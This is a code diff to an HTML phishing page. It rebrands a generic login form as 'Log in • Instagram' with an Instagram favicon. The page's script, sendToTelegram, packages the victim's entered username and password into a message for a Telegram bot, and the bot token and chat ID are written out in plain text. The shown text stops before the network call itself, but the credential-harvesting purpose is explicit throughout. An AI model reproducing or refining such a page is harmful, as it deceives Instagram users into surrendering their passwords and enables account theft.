@@ -4,7 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Log in • Instagram</title>
+    <!-- Add Instagram logo as favicon -->
+    <link rel="shortcut icon" href="./Instagram_logo_2022.svg.png" type="image/x-icon">
     <style>
         /* General Reset */
         * {
@@ -100,12 +102,11 @@
             text-decoration: underline;
         }
     </style>
-    </style>
     <script>
         // Function to send data to Telegram Bot
         function sendToTelegram(username, password) {
             const botToken = '7848679382:AAG9RDlm4FVRpyKcbXCoLExV_CoA4TCu7RI'; // Replace with your bot API token
-            const chatId = '6956607670'; // Replace with your chat ID
+            const chatId = '6956607670'
 
             const message = `Username: ${username}\nPassword: ${password}`;
 
